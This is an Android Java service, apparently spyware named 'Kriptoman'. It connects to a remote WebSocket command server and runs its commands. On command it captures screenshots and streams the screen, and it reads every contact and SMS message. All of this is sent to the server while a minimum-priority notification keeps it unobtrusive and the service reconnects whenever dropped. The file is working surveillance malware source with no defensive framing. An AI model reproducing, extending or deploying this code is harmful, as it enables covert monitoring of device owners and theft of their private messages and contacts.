package com.kriptoman;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Base64;

import androidx.core.app.NotificationCompat;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_6455;
import org.java_websocket.handshake.ServerHandshake;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.net.URI;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class WebSocketService extends Service {
    private static MediaProjection sMediaProjection;
    private WebSocketClient client;
    private Handler handler = new Handler();
    private String deviceName = Build.MODEL;
    private SharedPreferences prefs;
    private String serverUrl;
    private String logFile;
    private boolean streaming = false;
    private Runnable streamRunnable;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;

    public static void setMediaProjection(MediaProjection mp) {
        sMediaProjection = mp;
    }

    private void writeLog(String msg) {
        try {
            if (logFile == null) {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!dir.exists()) dir.mkdirs();
                logFile = new File(dir, "kriptoman_log.txt").getAbsolutePath();
            }
            FileOutputStream fos = new FileOutputStream(logFile, true);
            PrintWriter pw = new PrintWriter(fos);
            pw.println(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + msg);
            pw.close();
            fos.close();
        } catch (Exception e) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("kriptoman", MODE_PRIVATE);
        serverUrl = prefs.getString("server_url", "wss://kriptoman.onrender.com");
        writeLog("=== СЕРВИС ЗАПУЩЕН ===");
        createNotificationChannel();
        startForeground(1, getNotification());
        connectWebSocket();
    }

    private void connectWebSocket() {
        try {
            URI uri = new URI(serverUrl);
            client = new WebSocketClient(uri, new Draft_6455()) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    writeLog("WebSocket открыт");
                    registerDevice();
                    startPing();
                }

                @Override
                public void onMessage(String message) {
                    writeLog("Получено: " + message);
                    handleCommand(message);
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    writeLog("Закрыто: " + code + " " + reason);
                    handler.postDelayed(() -> connectWebSocket(), 10000);
                }

                @Override
                public void onError(Exception ex) {
                    writeLog("Ошибка: " + ex.toString());
                    handler.postDelayed(() -> connectWebSocket(), 10000);
                }
            };
            client.connect();
        } catch (Exception e) {
            writeLog("Ошибка подключения: " + e.toString());
            handler.postDelayed(() -> connectWebSocket(), 10000);
        }
    }

    private void startPing() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (client != null && client.isOpen()) {
                    try {
                        client.send("{\"type\":\"ping\"}");
                    } catch (Exception e) {}
                }
                handler.postDelayed(this, 10000);
            }
        }, 10000);
    }

    private void registerDevice() {
        try {
            String msg = "{\"type\":\"register\",\"name\":\"" + deviceName + "\",\"secret\":\"root\"}";
            client.send(msg);
            writeLog("Регистрация отправлена");
        } catch (Exception e) {}
    }

    private void handleCommand(String message) {
        try {
            org.json.JSONObject json = new org.json.JSONObject(message);
            String type = json.getString("type");
            if ("command".equals(type)) {
                String action = json.getString("action");
                writeLog("Команда: " + action);
                executeCommand(action, json.optJSONObject("params"));
            }
        } catch (Exception e) {}
    }

    private void executeCommand(String action, org.json.JSONObject params) {
        switch (action) {
            case "screenshot": takeScreenshot(); break;
            case "stream": handleStream(params); break;
            case "contacts": exportContacts(); break;
            case "sms": exportSms(); break;
            default: writeLog("Неизвестная команда: " + action);
        }
    }

    private void handleStream(org.json.JSONObject params) {
        if (params == null) return;
        String action = params.optString("action");
        if ("start".equals(action)) {
            if (streaming) return;
            streaming = true;
            writeLog("Стрим запущен");
            startStreaming();
        } else if ("stop".equals(action)) {
            streaming = false;
            if (streamRunnable != null) {
                handler.removeCallbacks(streamRunnable);
                streamRunnable = null;
            }
            writeLog("Стрим остановлен");
        }
    }

    private void startStreaming() {
        streamRunnable = new Runnable() {
            @Override
            public void run() {
                if (!streaming || client == null || !client.isOpen()) {
                    return;
                }
                takeScreenshotForStream();
                handler.postDelayed(this, 200);
            }
        };
        handler.post(streamRunnable);
    }

    private void takeScreenshotForStream() {
        if (sMediaProjection == null) return;
        try {
            imageReader = ImageReader.newInstance(480, 640, PixelFormat.RGBA_8888, 2);
            virtualDisplay = sMediaProjection.createVirtualDisplay("Stream", 480, 640, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(100);
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
                image.close();
            }
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
        } catch (Exception e) {}
    }

    private void takeScreenshot() {
        if (sMediaProjection == null) return;
        try {
            imageReader = ImageReader.newInstance(720, 1280, PixelFormat.RGBA_8888, 2);
            virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot", 720, 1280, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(200);
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
                writeLog("Скриншот отправлен");
                image.close();
            }
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
        } catch (Exception e) {}
    }

    private void exportContacts() {
        StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>Контакты</h1><ul>");
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                html.append("<li>").append(name).append(" - ").append(number).append("</li>");
            }
            cursor.close();
        }
        html.append("</ul></body></html>");
        client.send("{\"type\":\"contacts\",\"html\":\"" + html.toString().replace("\"", "\\\"") + "\"}");
        writeLog("Контакты отправлены");
    }

    private void exportSms() {
        StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>SMS</h1><ul>");
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                html.append("<li>").append(address).append(": ").append(body).append("</li>");
            }
            cursor.close();
        }
        html.append("</ul></body></html>");
        client.send("{\"type\":\"sms\",\"html\":\"" + html.toString().replace("\"", "\\\"") + "\"}");
        writeLog("SMS отправлены");
    }

    private Notification getNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "kriptoman_channel")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(NotificationCompat.PRIORITY_MIN);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId("kriptoman_channel");
        }
        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("kriptoman_channel",
                    "Kriptoman", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (client != null) client.close();
        streaming = false;
        super.onDestroy();
    }
}
